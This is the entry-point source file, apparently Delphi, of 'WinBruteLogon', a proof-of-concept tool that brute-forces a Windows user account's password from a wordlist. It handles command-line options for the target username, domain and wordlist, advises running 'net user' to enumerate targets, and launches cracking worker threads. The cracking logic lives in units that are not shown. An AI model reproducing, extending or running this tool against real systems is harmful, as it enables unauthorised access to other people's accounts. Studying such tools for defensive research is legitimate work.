program WinBruteLogon;


uses
  System.SysUtils,
  Windows,
  UntWorker in 'Units\UntWorker.pas',
  UntFunctions in 'Units\UntFunctions.pas',
  UntStringDefs in 'Units\UntStringDefs.pas',
  UntGlobalDefs in 'Units\UntGlobalDefs.pas',
  UntTypeDefs in 'Units\UntTypeDefs.pas';

procedure DisplayHelpBanner(AErrorMsg : String = ''; AFull : Boolean = False);
begin
  if AFull then begin
    WriteLn;
    WriteColoredWord('WinBruteLogon', FOREGROUND_GREEN);
    WriteLn(' PoC');
    WriteLn('Jean-Pierre LESUEUR (@DarkCoderSc)');
    WriteLn('https://github.com/darkcodersc');
    WriteLn('https://www.phrozen.io/');
    WriteLn;
  end;

  if (AErrorMsg <> '') then begin
    Debug(AErrorMsg, dlError);
    WriteLn;
  end;
  ///

  Write('Usage: ');
  WriteColoredWord('winbrutelogon');
  WriteLn('.exe -u <username> -w <wordlist_file>');

  Write(StringOfChar(' ', 7));
  WriteColoredWord('winbrutelogon');
  WriteLn('.exe -h : Show help.');

  if AFull then begin
    WriteLn;

    WriteLn('-h : Display this menu.');
    WriteLn('-u : Username to crack.');
    WriteLn('-d : Optional domain name.');
    WriteLn('-w : Wordlist file.');
    WriteLn(' - : Read wordlist from Stdin.');
    WriteLn('-v : Verbose mode.');

    WriteLn;
  end;
end;

var AWorkers      : TWorkers      = nil;
    AUserName     : String        = '';
    ADomainName   : String        = '';
    AWordlist     : String        = '';
    AWordlistMode : TWordlistMode = wmUndefined;
begin
  IsMultiThread := True;

  try
    {
      parametros
    }
    if CommandLineOptionExists('h') then begin
      DisplayHelpBanner('', True);

      Exit();
    end;



    if NOT GetCommandLineOption('u', AUserName) then
      raise EOptionException.Create('You need to specify a target username with option `-u`.\nYou can run `net user` command to enumerate available users.');

    if GetCommandLineOption('w', AWordlist) then begin
      AWordlistMode := wmFile;

      if NOT FileExists(AWordlist) then
        raise Exception.Create(Format(SD_FILE_NOT_FOUND, [AWordlist]));
    end else if CommandLineOptionExists('-') then
      AWordlistMode := wmStdin;
    ///

    if (AWordlistMode = wmUndefined) then
      raise EOptionException.Create('You need to specify a wordlist file with option `-w` or via stdin with option `-`.');

    GetCommandLineOption('d', ADomainName);

    G_DEBUG := CommandLineOptionExists('v');

    {
     configura protocolo e inicia o cracking
    }
    AWorkers := TWorkers.Create(AUserName, AWordlistMode, ADomainName);

    case AWordlistMode of
      wmFile : begin
        AWorkers.WordlistFile := AWordlist;
      end;

      {
      ... : begin

      end;
      }
    end;

    {
      Cria uma lista de palavras na memória com o modo escolhido
    }
    if not AWorkers.Build() then
      raise Exception.Create('Could not build wordlist in memory.');

    {
      Comece o processo de cracking
    }
    AWorkers.Start();
  except
    on E : EOptionException do
      DisplayHelpBanner(E.Message);

    on E : Exception do begin
      if (E.Message <> '') then
        Debug(Format('message=[%s]', [E.Message]), dlError);
    end;
  end;
end.
